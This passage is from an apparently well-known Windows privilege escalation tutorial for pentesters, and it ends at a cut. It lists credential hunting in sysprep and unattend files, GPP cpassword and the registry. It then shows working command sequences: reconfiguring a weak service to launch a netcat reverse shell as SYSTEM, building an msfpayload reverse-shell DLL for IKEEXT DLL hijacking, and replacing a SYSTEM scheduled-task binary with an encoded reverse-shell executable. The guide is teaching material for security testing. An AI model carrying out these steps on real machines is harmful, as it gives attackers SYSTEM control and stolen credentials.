Update           KB2769034  11/23/2013</div><div>http://support.microsoft.com/?kbid=2769165  Update           KB2769165  11/23/2013</div><div>http://support.microsoft.com/?kbid=2769166  Update           KB2769166  11/26/2013</div><div>http://support.microsoft.com/?kbid=2770660  Security Update  KB2770660  11/23/2013</div><div>http://support.microsoft.com/?kbid=2770917  Update           KB2770917  11/24/2013</div><div>http://support.microsoft.com/?kbid=2771821  Update           KB2771821  11/24/2013</div><div>[..Snip..]</div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;"><div>As always with Windows, the output isn't exactly ready for use. The best strategy is to look for privilege escalation exploits and look up their respective KB patch numbers. Such exploits include, but are not limited to, KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799). After enumerating the OS version and Service Pack you should find out which privilege escalation vulnerabilities could be present. Using the KB patch numbers you can grep the installed patches to see if any are missing.</div><div><br/></div><div>You can see the syntax to grep the patches below:</div></div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;"><div>Next we will have a look at mass rollouts. If there is an environment where many machines need to be installed, typically, a technician will not go around from machine to machine. There are a couple of solutions to install machines automatically. What these methods are and how they work is less important for our purposes but the main thing is that they leave behind configuration files which are used for the installation process. These configuration files contain a lot of sensitive sensitive information such as the operating system product key and Administrator password. What we are most interested in is the Admin password as we can use that to elevate our privileges.</div><div><br/></div><div>Typically these are the directories that contain the configuration files (however it is a good idea to check the entire OS):</div><div><span style="font-style: italic;">c:\sysprep.inf</span></div><div><span style="font-style: italic;">c:\sysprep\sysprep.xml</span></div><div><span style="font-style: italic;">%WINDIR%\Panther\Unattend\Unattended.xml</span></div><div><span style="font-style: italic;">%WINDIR%\Panther\Unattended.xml</span></div><div><br/></div><div>These files either contain clear-text passwords or in a Base64 encoded format. You can see some sample file output below.</div></div><div><div><span style="font-weight: bold;"># This is a sample from sysprep.inf with clear-text credentials.</span></div><div><br/></div><div>[GuiUnattended]</div><div>OEMSkipRegional=1</div><div>OemSkipWelcome=1</div><div>AdminPassword=s3cr3tp4ssw0rd</div><div>TimeZone=20</div><div><br/></div><pre><div><span style="font-weight: bold;"># This is a sample from sysprep.xml with Base64 "encoded" credentials. Please people Base64 is not</span></div><div><span style="font-weight: bold;">encryption, I take more precautions to protect my coffee. The password here is "SuperSecurePassword".</span></div><div><br/></div><div>&lt;LocalAccounts&gt;</div><div>    &lt;LocalAccount wcm:action="add"&gt;</div><div>        &lt;Password&gt;</div><div>            &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;</div><div>            &lt;PlainText&gt;false&lt;/PlainText&gt;</div><div>        &lt;/Password&gt;</div><div>        &lt;Description&gt;Local Administrator&lt;/Description&gt;</div><div>        &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;</div><div>        &lt;Group&gt;Administrators&lt;/Group&gt;</div><div>        &lt;Name&gt;Administrator&lt;/Name&gt;</div><div>    &lt;/LocalAccount&gt;</div><div>&lt;/LocalAccounts&gt;</div><div><br/></div><pre><div><span style="font-weight: bold;"># Sample from Unattended.xml with the same "secure" Base64 encoding.</span></div><div><br/></div><div>&lt;AutoLogon&gt;</div><div>    &lt;Password&gt;</div><div>        &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;</div><div>        &lt;PlainText&gt;false&lt;/PlainText&gt;</div><div>    &lt;/Password&gt;</div><div>    &lt;Enabled&gt;true&lt;/Enabled&gt;</div><div>    &lt;Username&gt;Administrator&lt;/Username&gt;</div><div>&lt;/AutoLogon&gt;</div></pre></pre></div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">On the recommendation of Ben Campbell (<a href="https://twitter.com/Meatballs__" target="_blank">@Meatballs__</a>) I'm adding Group Policy Preference saved passwords to the list of quick fails. GPO preference files can be used to create local users on domain machines. When the box you compromise is connected to a domain it is well worth looking for the Groups.xml file which is stored in SYSVOL. Any authenticated user will have read access to this file. The password in the xml file is "obscured" from the casual user by encrypting it with AES, I say obscured because the static key is published on the msdn website allowing for easy decryption of the stored value.</div><div><img src="Windows%20Privilege%20Escalation%20Fundamentals.resources/5E173EF3-0FE0-450F-949C-0D7B40BA6181.png" height="212" width="510"/><br/></div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;"><div>In addition to Groups.xml several other policy preference files can have the optional "cPassword" attribute set:</div><div>Services\Services.xml: <a href="http://msdn.microsoft.com/en-us/library/cc980070.aspx" target="_blank">Element-Specific Attributes</a></div><div>ScheduledTasks\ScheduledTasks.xml: <a href="http://msdn.microsoft.com/en-us/library/cc422920.aspx" target="_blank">Task Inner Element</a>, <a href="http://msdn.microsoft.com/en-us/library/dd341350.aspx" target="_blank">TaskV2 Inner Element</a>, <a href="http://msdn.microsoft.com/en-us/library/dd304114.aspx" target="_blank">ImmediateTaskV2 Inner Element</a></div><div>Printers\Printers.xml: <a href="http://msdn.microsoft.com/en-us/library/cc422918.aspx" target="_blank">SharedPrinter Element</a></div><div>Drives\Drives.xml: <a href="http://msdn.microsoft.com/en-us/library/cc704598.aspx" target="_blank">Element-Specific Attributes</a></div><div>DataSources\DataSources.xml: <a href="http://msdn.microsoft.com/en-us/library/cc422926.aspx" target="_blank">Element-Specific Attributes</a></div></div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">This vulnerability can be exploited by manually browsing SYSVOL and grabbing the relevant files as demonstrated below.</div><div><img src="Windows%20Privilege%20Escalation%20Fundamentals.resources/65F7603A-0312-46F9-BAA4-EF6E02D1BF03.png" height="231" width="576"/><br/></div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">However we all like automated solutions so we can get to the finish line as quickly as possible. There are two main options here, depending on the kind of shell/access that we have. There is (1) a metasploit module which can be executed through an established session <a href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp" target="_blank">here</a> or (2) you can use Get-GPPPassword which is part of <a href="https://github.com/mattifestation/PowerSploit" target="_blank">PowerSploit</a>. PowerSploit is an excellent powershell framework, by Matt Graeber, tailored to reverse engineering, forensics and pentesting.</div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;"><div>The next thing we will look for is a strange registry setting "AlwaysInstallElevated", if this setting is enabled it allows users of any privilege level to install *.msi files as NT AUTHORITY\SYSTEM. It seems like a strange idea to me that you would create low privilege users (to restrict their use of the OS) but give them the ability to install programs as SYSTEM. For more background reading on this issue you can have a look <a href="http://www.greyhathacker.net/?p=185" target="_blank">here</a> at an article by Parvez from GreyHatHacker who originally reported this as a security concern.</div><div><br/></div><div>To be able to use this we need to check that two registry keys are set, if that is the case we can pop a SYSTEM shell. You can see the sytntax to query the respective registry keys below.</div></div><div    /><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">To finish off this section we will do some quick searching on the operating system and hope we strike gold. You can see the syntax for our searches below.</div><div    /><div><span style="font-weight: bold;"># The command below will search the file system for file names containing certain keywords. You can</span></div><div><span style="font-weight: bold;">specify as many keywords as you wish.</span></div><div><br/></div><div>C:\Windows\system32&gt; dir /s *pass* == *cred* == *vnc* == *.config*</div><div><br/></div><div><span style="font-weight: bold;"># Search certain file types for a keyword, this can generate a lot of output.</span></div><div><br/></div><div>C:\Windows\system32&gt; findstr /si password *.xml *.ini *.txt</div><div><br/></div><div><span style="font-weight: bold;"># Similarly the two commands below can be used to grep the registry for keywords, in this case "password".</span></div><div><br/></div><div>C:\Windows\system32&gt; reg query HKLM /f password /t REG_SZ /s</div><div>C:\Windows\system32&gt; reg query HKCU /f password /t REG_SZ /s</div><h2>Î”t for t7 to t10 - Roll Up Your Sleeves</h2><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;"><div>Hopefully by now we already have a SYSTEM shell but if we don't there are still a few avenues of attack left to peruse. In this final part we will look at Windows services and file/folder permissions. Our goal here is to use weak permissions to elevate our session privileges.</div><div><br/></div><div>We will be checking a lot of access rights so we should grab a copy of accesschk.exe which is a tool from Microsoft's Sysinternals Suite. Microsoft Sysinternals contains a lot of excellent tools, it's a shame that Microsoft hasn't added them to the standard Windows build. You can download the suite from Microsoft technet <a href="http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx" target="_blank">here</a>.</div><div><br/></div><div>We will start off with Windows services as there are some quick wins to be found there. Generally modern operating systems won't contain vulnerable services. Vulnerable, in this case, means that we can reconfigure the service parameters. Windows services are kind of like application shortcut's, have a look at the example below.</div></div><div    /><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">We can check the required privilege level for each service using accesschk.</div><div    /><div><span style="font-weight: bold;"># We can see the permissions that each user level has, you can also use "accesschk.exe -ucqv *" to list</span></div><div><span style="font-weight: bold;">all services.</span></div><div><br/></div><div>C:\&gt; accesschk.exe -ucqv Spooler</div><div><br/></div><div>Spooler</div><div><br/></div><div>  R  NT AUTHORITY\Authenticated Users</div><div>        SERVICE_QUERY_STATUS</div><div>        SERVICE_QUERY_CONFIG</div><div>        SERVICE_INTERROGATE</div><div>        SERVICE_ENUMERATE_DEPENDENTS</div><div>        SERVICE_USER_DEFINED_CONTROL</div><div>        READ_CONTROL</div><div>  R  BUILTIN\Power Users</div><div>        SERVICE_QUERY_STATUS</div><div>        SERVICE_QUERY_CONFIG</div><div>        SERVICE_INTERROGATE</div><div>        SERVICE_ENUMERATE_DEPENDENTS</div><div>        SERVICE_START</div><div>        SERVICE_USER_DEFINED_CONTROL</div><div>        READ_CONTROL</div><div>  RW BUILTIN\Administrators</div><div>        SERVICE_ALL_ACCESS</div><div>  RW NT AUTHORITY\SYSTEM</div><div>        SERVICE_ALL_ACCESS</div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;"><div>Accesschk can automatically check if we have write access to a Windows service with a certain user level. Generally as a low privilege user we will want to check for "Authenticated Users". Make sure to check which user groups you user belongs to, "Power Users" for example is considered a low privilege user group (though it is not widely used).</div><div><br/></div><div>Lets compare the output on Windows 8 and on Windows XP SP0.</div></div><div    /><div><span style="font-weight: bold;"># This is on Windows 8.</span></div><div><br/></div><div>C:\Users\b33f\tools\Sysinternals&gt; accesschk.exe -uwcqv "Authenticated Users" *</div><div>No matching objects found.</div><div><br/></div><div><span style="font-weight: bold;"># On a default Windows XP SP0 we can see there is a pretty big security fail.</span></div><div><br/></div><div>C:\&gt; accesschk.exe -uwcqv "Authenticated Users" *</div><div>RW SSDPSRV</div><div>        SERVICE_ALL_ACCESS</div><div>RW upnphost</div><div>        SERVICE_ALL_ACCESS</div><div>Â Â Â Â Â Â Â Â </div><div>C:\&gt; accesschk.exe -ucqv SSDPSRV</div><div><br/></div><div>SSDPSRV</div><div><br/></div><div>  RW NT AUTHORITY\SYSTEM</div><div>        SERVICE_ALL_ACCESS</div><div>  RW BUILTIN\Administrators</div><div>        SERVICE_ALL_ACCESS</div><div>  RW NT AUTHORITY\Authenticated Users</div><div>        SERVICE_ALL_ACCESS</div><div>  RW BUILTIN\Power Users</div><div>        SERVICE_ALL_ACCESS</div><div>  RW NT AUTHORITY\LOCAL SERVICE</div><div>        SERVICE_ALL_ACCESS</div><div><br/></div><div>C:\&gt; accesschk.exe -ucqv upnphost</div><div><br/></div><div>upnphost</div><div><br/></div><div>  RW NT AUTHORITY\SYSTEM</div><div>        SERVICE_ALL_ACCESS</div><div>  RW BUILTIN\Administrators</div><div>        SERVICE_ALL_ACCESS</div><div>  RW NT AUTHORITY\Authenticated Users</div><div>        SERVICE_ALL_ACCESS</div><div>  RW BUILTIN\Power Users</div><div>        SERVICE_ALL_ACCESS</div><div>  RW NT AUTHORITY\LOCAL SERVICE</div><div>        SERVICE_ALL_ACCESS</div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;"><div>This issue was later resolved with the introduction of XP SP2, however on SP0&amp;SP1 it can be used as a universal local privilege escalation vulnerability. By reconfiguring the service we can let it run any binary of our choosing with SYSTEM level privileges.</div><div><br/></div><div>Let's have a look how this is done in practise. In this case the service will execute netcat and open a reverse shell with SYSTEM level privileges. Other options are certainly possible.</div></div><div    /><div>C:\&gt; sc qc upnphost</div><div><br/></div><div>[SC] GetServiceConfig SUCCESS</div><div><br/></div><div>SERVICE_NAME: upnphost</div><div>        TYPE               : 20  WIN32_SHARE_PROCESS</div><div>        START_TYPE         : 3   DEMAND_START</div><div>        ERROR_CONTROL      : 1   NORMAL</div><div>        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService</div><div>        LOAD_ORDER_GROUP   :</div><div>        TAG                : 0</div><div>        DISPLAY_NAME       : Universal Plug and Play Device Host</div><div>        DEPENDENCIES       : SSDPSRV</div><div>        SERVICE_START_NAME : NT AUTHORITY\LocalService</div><div>Â Â Â Â Â Â Â Â </div><div>C:\&gt; sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"</div><div>[SC] ChangeServiceConfig SUCCESS</div><div><br/></div><div>C:\&gt; sc config upnphost obj= ".\LocalSystem" password= ""</div><div>[SC] ChangeServiceConfig SUCCESS</div><div><br/></div><div>C:\&gt; sc qc upnphost</div><div><br/></div><div>[SC] GetServiceConfig SUCCESS</div><div><br/></div><div>SERVICE_NAME: upnphost</div><div>        TYPE               : 20  WIN32_SHARE_PROCESS</div><div>        START_TYPE         : 3   DEMAND_START</div><div>        ERROR_CONTROL      : 1   NORMAL</div><div>        BINARY_PATH_NAME   : C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe</div><div>        LOAD_ORDER_GROUP   :</div><div>        TAG                : 0</div><div>        DISPLAY_NAME       : Universal Plug and Play Device Host</div><div>        DEPENDENCIES       : SSDPSRV</div><div>        SERVICE_START_NAME : LocalSystem</div><div>Â Â Â Â Â Â Â Â </div><div>C:\&gt; net start upnphost</div><div    /><div          /><div>          <a href="http://www.fuzzysecurity.com/tutorials/images/priv01_big.png" target="_blank">          <img src="Windows%20Privilege%20Escalation%20Fundamentals.resources/45EA79B0-C001-4862-B16B-BC00701625F8.png" height="160" width="314"/>          </a>          </div><div          /><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">Service Shell (upnphost)</div><div      /><div    /><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">We will not always have full access to a service even if it is incorrectly configured. The image below is taken from Brett Moore's presentation on Windows privilege escalation, any of these access rights will give us a SYSTEM shell.</div><div><img src="Windows%20Privilege%20Escalation%20Fundamentals.resources/2280B17E-C414-49F3-9455-480902D6ECE3.png" height="198" width="576"/><br/></div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;"><div>The important thing to remember is that we find out what user groups our compromised session belongs to. As mentioned previously "Power Users" is also considered to be a low privileged user group. "Power Users" have their own set of vulnerabilities, Mark Russinovich has written a very interesting article on the subject.</div><div><br/></div><div>The Power in Power Users (Mark Russinovich) - <a href="http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx" target="_blank">here</a></div><div><br/></div><div>Finally we will examine file/folder permissions, if we can not attack the OS directly we will let the OS do all the hard work. There is to much ground to cover here so instead I will show you two kinds of permission vulnerabilities and how to take advantage of them. Once you grasp the general idea you will be able to apply these techniques to other situations.</div><div><br/></div><div>For our first example we will replicate the results of a post written by Parvez from GreyHatHacker; "Elevating privileges by exploiting weak folder permissions". This is a great privilege escalation write-up and I highly recommend that you read his post <a href="http://www.greyhathacker.net/?p=738" target="_blank">here</a>.</div><div><br/></div><div>This example is a special case of DLL hijacking. Programs usually can't function by themselves, they have a lot of resources they need to hook into (mostly DLL's but also proprietary files). If a program or service loads a file from a directory we have write access to we can abuse that to pop a shell with the privileges the program runs as.</div><div><br/></div><div>Generally a Windows application will use pre-defined search paths to find DLL's and it will check these paths in a specific order. DLL hijacking usually happens by placing a malicious DLL in one of these paths while making sure that DLL is found before the legitimate one. This problem can be mitigated by having the application specify absolute paths to the DLL's that it needs.</div><div><br/></div><div>You can see the DLL search order on 32-bit systems below:</div><div>1 - The directory from which the application loaded</div><div>2 - 32-bit System directory (C:\Windows\System32)</div><div>3 - 16-bit System directory (C:\Windows\System)</div><div>4 - Windows directory (C:\Windows)</div><div>5 - The current working directory (CWD)</div><div>6 - Directories in the PATH environment variable (system then user)</div><div><br/></div><div>It sometimes happens that applications attempt load DLL's that do not exist on the machine. This may occur due to several reasons, for example if the DLL is only required for certain plug-ins or features which are not installed. In this case Parvez discovered that certain Windows services attempt to load DLL's that do not exist in default installations.</div><div><br/></div><div>Since the DLL in question does not exist we will end up traversing all the search paths. As a low privilege user we have little hope of putting a malicious DLL in 1-4, 5 is not a possibility in this case because we are talking about a Windows service but if we have write access to any of the directories in the Windows PATH we win.</div><div><br/></div><div>Let's have a look at how this works in practise, for our example we will be using the IKEEXT (IKE and AuthIP IPsec Keying Modules) service which tries to load wlbsctrl.dll.</div></div><div    /><div><span style="font-weight: bold;"># This is on Windows 7 as low privilege user1.</span></div><div><br/></div><div>C:\Users\user1\Desktop&gt; echo %username%</div><div><br/></div><div>user1</div><div><br/></div><div><span style="font-weight: bold;"># We have a win here since any non-default directory in "C:\" will give write access to authenticated</span></div><div><span style="font-weight: bold;">users.</span></div><div>Â Â Â Â Â Â Â Â </div><div>C:\Users\user1\Desktop&gt; echo %path%</div><div><br/></div><div>C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;</div><div>C:\Program Files\OpenVPN\bin;C:\Python27</div><div><br/></div><div><span style="font-weight: bold;"># We can check our access permissions with accesschk or cacls.</span></div><div><br/></div><div>C:\Users\user1\Desktop&gt; accesschk.exe -dqv "C:\Python27"</div><div><br/></div><div>C:\Python27</div><div>  Medium Mandatory Level (Default) [No-Write-Up]</div><div>  RW BUILTIN\Administrators</div><div>        FILE_ALL_ACCESS</div><div>  RW NT AUTHORITY\SYSTEM</div><div>        FILE_ALL_ACCESS</div><div>  R  BUILTIN\Users</div><div>        FILE_LIST_DIRECTORY</div><div>        FILE_READ_ATTRIBUTES</div><div>        FILE_READ_EA</div><div>        FILE_TRAVERSE</div><div>        SYNCHRONIZE</div><div>        READ_CONTROL</div><div>  RW NT AUTHORITY\Authenticated Users</div><div>        FILE_ADD_FILE</div><div>        FILE_ADD_SUBDIRECTORY</div><div>        FILE_LIST_DIRECTORY</div><div>        FILE_READ_ATTRIBUTES</div><div>        FILE_READ_EA</div><div>        FILE_TRAVERSE</div><div>        FILE_WRITE_ATTRIBUTES</div><div>        FILE_WRITE_EA</div><div>        DELETE</div><div>        SYNCHRONIZE</div><div>        READ_CONTROL</div><div><br/></div><div>C:\Users\user1\Desktop&gt; cacls "C:\Python27"</div><div><br/></div><div>C:\Python27 BUILTIN\Administrators:(ID)F</div><div>            BUILTIN\Administrators:(OI)(CI)(IO)(ID)F</div><div>            NT AUTHORITY\SYSTEM:(ID)F</div><div>            NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F</div><div>            BUILTIN\Users:(OI)(CI)(ID)R</div><div>            NT AUTHORITY\Authenticated Users:(ID)C</div><div>            NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C</div><div>Â Â Â Â Â Â Â Â Â Â Â Â </div><div><span style="font-weight: bold;"># Before we go over to action we need to check the status of the IKEEXT service. In this case we can see</span></div><div><span style="font-weight: bold;">it is set to "AUTO_START" so it will launch on boot!</span></div><div>Â Â Â Â Â Â Â Â </div><div>C:\Users\user1\Desktop&gt; sc qc IKEEXT</div><div><br/></div><div>[SC] QueryServiceConfig SUCCESS</div><div><br/></div><div>SERVICE_NAME: IKEEXT</div><div>        TYPE               : 20  WIN32_SHARE_PROCESS</div><div>        START_TYPE         : 2   AUTO_START</div><div>        ERROR_CONTROL      : 1   NORMAL</div><div>        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs</div><div>        LOAD_ORDER_GROUP   :</div><div>        TAG                : 0</div><div>        DISPLAY_NAME       : IKE and AuthIP IPsec Keying Modules</div><div>        DEPENDENCIES       : BFE</div><div>        SERVICE_START_NAME : LocalSystem</div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">Now we know the necessary conditions are met we can generate a malicious DLL and pop a shell!</div><div    /><div>root@darkside:~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' O</div><div><br/></div><div>       Name: Windows Command Shell, Reverse TCP Inline</div><div>     Module: payload/windows/shell_reverse_tcp</div><div>   Platform: Windows</div><div>       Arch: x86</div><div>Needs Admin: No</div><div> Total size: 314</div><div>       Rank: Normal</div><div><br/></div><div>Provided by:</div><div>  vlad902 &lt;vlad902@gmail.com&gt;</div><div>  sf &lt;stephen_fewer@harmonysecurity.com&gt;</div><div><br/></div><div>Basic options:</div><div>Name      Current Setting  Required  Description</div><div>----      ---------------  --------  -----------</div><div>EXITFUNC  process          yes       Exit technique: seh, thread, process, none</div><div>LHOST     127.0.0.1        yes       The listen address</div><div>LPORT     9988             yes       The listen port</div><div><br/></div><div>Description:</div><div>  Connect back to attacker and spawn a command shell</div><div><br/></div><div>root@darkside:~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' D &gt; </div><div>/root/Desktop/evil.dll</div><div><br/></div><div>Created by msfpayload (http://www.metasploit.com).</div><div>Payload: windows/shell_reverse_tcp</div><div> Length: 314</div><div>Options: {"lhost"=&gt;"127.0.0.1", "lport"=&gt;"9988"}</div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">After transferring the DLL to our target machine all we need to do is rename it to wlbsctrl.dll and move it to "C:\Python27". Once this is done we need to wait patiently for the machine to be rebooted (or we can try to force a reboot) and we will get a SYSTEM shell.</div><div    /><div><span style="font-weight: bold;"># Again, this is as low privilege user1.</span></div><div><br/></div><div>C:\Users\user1\Desktop&gt; dir</div><div><br/></div><div> Volume in drive C has no label.</div><div> Volume Serial Number is 948D-A98F</div><div><br/></div><div> Directory of C:\Users\user1\Desktop</div><div><br/></div><div>02/18/2014  01:49 PM    &lt;DIR&gt;          .</div><div>02/18/2014  01:49 PM    &lt;DIR&gt;          ..</div><div>04/22/2013  09:39 AM           331,888 accesschk.exe</div><div>02/18/2014  12:38 PM            14,336 evil.dll</div><div>01/25/2014  12:46 AM            36,864 fubar.exe</div><div>01/22/2014  08:17 AM    &lt;DIR&gt;          incognito2</div><div>06/30/2011  01:52 PM         1,667,584 ncat.exe</div><div>11/22/2013  07:39 PM             1,225 wmic_info.bat</div><div>               5 File(s)      2,051,897 bytes</div><div>               3 Dir(s)      73,052,160 bytes free</div><div><br/></div><div>C:\Users\user1\Desktop&gt; copy evil.dll C:\Python27\wlbsctrl.dll</div><div><br/></div><div>        1 file(s) copied.</div><div>Â Â Â Â Â Â Â Â </div><div>C:\Users\user1\Desktop&gt; dir C:\Python27</div><div><br/></div><div> Volume in drive C has no label.</div><div> Volume Serial Number is 948D-A98F</div><div><br/></div><div> Directory of C:\Python27</div><div><br/></div><div>02/18/2014  01:53 PM    &lt;DIR&gt;          .</div><div>02/18/2014  01:53 PM    &lt;DIR&gt;          ..</div><div>10/20/2012  02:52 AM    &lt;DIR&gt;          DLLs</div><div>10/20/2012  02:52 AM    &lt;DIR&gt;          Doc</div><div>10/20/2012  02:52 AM    &lt;DIR&gt;          include</div><div>01/28/2014  03:45 AM    &lt;DIR&gt;          Lib</div><div>10/20/2012  02:52 AM    &lt;DIR&gt;          libs</div><div>04/10/2012  11:34 PM            40,092 LICENSE.txt</div><div>04/10/2012  11:18 PM           310,875 NEWS.txt</div><div>04/10/2012  11:31 PM            26,624 python.exe</div><div>04/10/2012  11:31 PM            27,136 pythonw.exe</div><div>04/10/2012  11:18 PM            54,973 README.txt</div><div>10/20/2012  02:52 AM    &lt;DIR&gt;          tcl</div><div>10/20/2012  02:52 AM    &lt;DIR&gt;          Tools</div><div>04/10/2012  11:31 PM            49,664 w9xpopen.exe</div><div>02/18/2014  12:38 PM            14,336 wlbsctrl.dll</div><div>               7 File(s)        523,700 bytes</div><div>               9 Dir(s)      73,035,776 bytes free</div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">Everything is set up, all we need to do now is wait for a system reboot. For demo purposes I have included a screenshot below where I use an Administrator command prompt to manually restart the service.</div><div    /><div          /><div>          <a href="http://www.fuzzysecurity.com/tutorials/images/priv03_big.png" target="_blank">          <img src="Windows%20Privilege%20Escalation%20Fundamentals.resources/53CC518D-CCE1-486A-9AE5-FA770577A7E0.png" height="160" width="314"/>          </a>          </div><div          /><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">Service Shell (IKEEXT)</div><div      /><div    /><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">For our final example we will have a look at the scheduled tasks. Going over the results we gathered earlier we come across the following entry.</div><div    /><div>HostName:                             B33F</div><div>TaskName:                             \LogGrabberTFTP</div><div>Next Run Time:                        2/19/2014 9:00:00 AM</div><div>Status:                               Ready</div><div>Logon Mode:                           Interactive/Background</div><div>Last Run Time:                        N/A</div><div>Last Result:                          1</div><div>Author:                               B33F\b33f</div><div>Task To Run:                          E:\GrabLogs\tftp.exe 10.1.1.99 GET log.out E:\GrabLogs\Logs\log.txt</div><div>Start In:                             N/A</div><div>Comment:                              N/A</div><div>Scheduled Task State:                 Enabled</div><div>Idle Time:                            Disabled</div><div>Power Management:                     Stop On Battery Mode, No Start On Batteries</div><div>Run As User:                          SYSTEM</div><div>Delete Task If Not Rescheduled:       Enabled</div><div>Stop Task If Runs X Hours and X Mins: 72:00:00</div><div>Schedule:                             Scheduling data is not available in this format.</div><div>Schedule Type:                        Daily</div><div>Start Time:                           9:00:00 AM</div><div>Start Date:                           2/17/2014</div><div>End Date:                             N/A</div><div>Days:                                 Every 1 day(s)</div><div>Months:                               N/A</div><div>Repeat: Every:                        Disabled</div><div>Repeat: Until: Time:                  Disabled</div><div>Repeat: Until: Duration:              Disabled</div><div>Repeat: Stop If Still Running:        Disabled</div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">There seems to be a TFTP client on the box which is connecting to a remote host and grabbing some kind of log file. We can see that this task runs each day at 9 AM and it runs with SYSTEM level privileges (ouch). Lets have a look if we have write access to this folder.</div><div    /><div>C:\Users\user1\Desktop&gt; accesschk.exe -dqv "E:\GrabLogs"</div><div><br/></div><div>E:\GrabLogs</div><div>  Medium Mandatory Level (Default) [No-Write-Up]</div><div>  RW BUILTIN\Administrators</div><div>        FILE_ALL_ACCESS</div><div>  RW NT AUTHORITY\SYSTEM</div><div>        FILE_ALL_ACCESS</div><div>  RW NT AUTHORITY\Authenticated Users</div><div>        FILE_ADD_FILE</div><div>        FILE_ADD_SUBDIRECTORY</div><div>        FILE_LIST_DIRECTORY</div><div>        FILE_READ_ATTRIBUTES</div><div>        FILE_READ_EA</div><div>        FILE_TRAVERSE</div><div>        FILE_WRITE_ATTRIBUTES</div><div>        FILE_WRITE_EA</div><div>        DELETE</div><div>        SYNCHRONIZE</div><div>        READ_CONTROL</div><div>  R  BUILTIN\Users</div><div>        FILE_LIST_DIRECTORY</div><div>        FILE_READ_ATTRIBUTES</div><div>        FILE_READ_EA</div><div>        FILE_TRAVERSE</div><div>        SYNCHRONIZE</div><div>        READ_CONTROL</div><div>Â Â Â Â Â Â Â Â </div><div>C:\Users\user1\Desktop&gt; dir "E:\GrabLogs"</div><div><br/></div><div> Volume in drive E is More</div><div> Volume Serial Number is FD53-2F00</div><div><br/></div><div> Directory of E:\GrabLogs</div><div><br/></div><div>02/18/2014  11:34 PM    &lt;DIR&gt;          .</div><div>02/18/2014  11:34 PM    &lt;DIR&gt;          ..</div><div>02/18/2014  11:34 PM    &lt;DIR&gt;          Logs</div><div>02/18/2014  09:21 PM           180,736 tftp.exe</div><div>               1 File(s)        180,736 bytes</div><div>               3 Dir(s)   5,454,602,240 bytes free</div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">Clearly this is a serious configuration issue, there is no need for this task to run as SYSTEM but even worse is the fact that any authenticated user has write access to the folder. Ideally for a pentesting engagement I would grab the TFTP client, backdoor the PE executable while making sure it still worked flawlessly and then drop it back on the target machine. However for the purpose of this example we can simple overwrite the binary with an executable generated by metasploit.</div><div    /><div>root@darkside:~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' O</div><div><br/></div><div>       Name: Windows Command Shell, Reverse TCP Inline</div><div>     Module: payload/windows/shell_reverse_tcp</div><div>   Platform: Windows</div><div>       Arch: x86</div><div>Needs Admin: No</div><div> Total size: 314</div><div>       Rank: Normal</div><div><br/></div><div>Provided by:</div><div>  vlad902 &lt;vlad902@gmail.com&gt;</div><div>  sf &lt;stephen_fewer@harmonysecurity.com&gt;</div><div><br/></div><div>Basic options:</div><div>Name      Current Setting  Required  Description</div><div>----      ---------------  --------  -----------</div><div>EXITFUNC  process          yes       Exit technique: seh, thread, process, none</div><div>LHOST     127.0.0.1        yes       The listen address</div><div>LPORT     9988             yes       The listen port</div><div><br/></div><div>Description:</div><div>  Connect back to attacker and spawn a command shell</div><div><br/></div><div>root@darkside:~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' R | msfencode -t</div><div>exe &gt; /root/Desktop/evil-tftp.exe</div><div><br/></div><div>[*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)</div><div style="-en-paragraph:true;margin-top:1em;margin-bottom:1em;">All that remains now is to upload our malicious executable and overwrite "E:\GrabLogs\tftp.exe". Once that is done we can get an early night sleep and wake up for our shell in the morning. An important thing to remember here is that we check the time/timezone on the box we are trying to compromise.</div><div    /><div>C:\Users\user1\Desktop&gt; dir</div><div><br/></div><div> Volume in drive C has no label.</div><div> Volume Serial Number is 948D-A98F</div><div><br/></div><div> Directory of C:\Users\user1\Desktop</div><div><br/></div><div>02/19/2014  01:36 AM    